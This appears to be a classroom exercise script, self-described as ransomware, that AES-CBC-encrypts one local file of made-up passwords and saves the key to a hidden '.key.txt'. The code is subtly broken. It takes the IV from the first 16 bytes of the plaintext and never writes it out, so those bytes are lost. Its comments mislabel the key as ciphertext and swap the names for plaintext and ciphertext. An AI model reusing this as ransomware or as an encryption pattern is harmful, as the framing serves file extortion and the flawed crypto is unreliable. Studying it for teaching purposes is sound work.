# This is the ransomware program that encrypts a specified file.  
# Make sure you spend time to understand how it works.  
# Feel free to change the input file to get a snesne of the programs capabilities.  
# The given input program is an example .txt file, with several made up passwords.  

#Use the following link to read documentation on this imported library:
        #https://pycryptodome.readthedocs.io/en/latest/


from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes 
from varGen import generateVar
from genPlaintext import genPT

genPT() #generate your random plaintext
variable = generateVar()
var = str(variable)
print("Variable is: " + str(variable))
input_file = 'plaintext.txt' # Input file
output_file = 'encrypted1.txt' #outputted cipher text (can rename)
of2 = '.key.txt'
file_out = open(of2, "w") 
file_out.write(var) # Write the varying length ciphertext to the file (this is the encrypted data)
file_out.close()
# Read the data from the file
# To learn more about reading and writing to files, feel free to use this link:
        # https://www.geeksforgeeks.org/reading-writing-text-files-python/
        
file_in = open(input_file, 'rb') # pass in plaintext
iv = file_in.read(16) # initialization vector
ciphered_data = file_in.read() # read data
file_in.close() #close

cipher = AES.new(variable, AES.MODE_CBC, iv=iv)  #  cipher
original_data = cipher.encrypt(pad((ciphered_data), AES.block_size))

file_out = open(output_file, "wb") 
#file_out.write(cipher.iv) # Write the iv to the output file (will be required for decryption)
file_out.write(original_data) # Write the varying length ciphertext to the file (this is the encrypted data)
file_out.close()



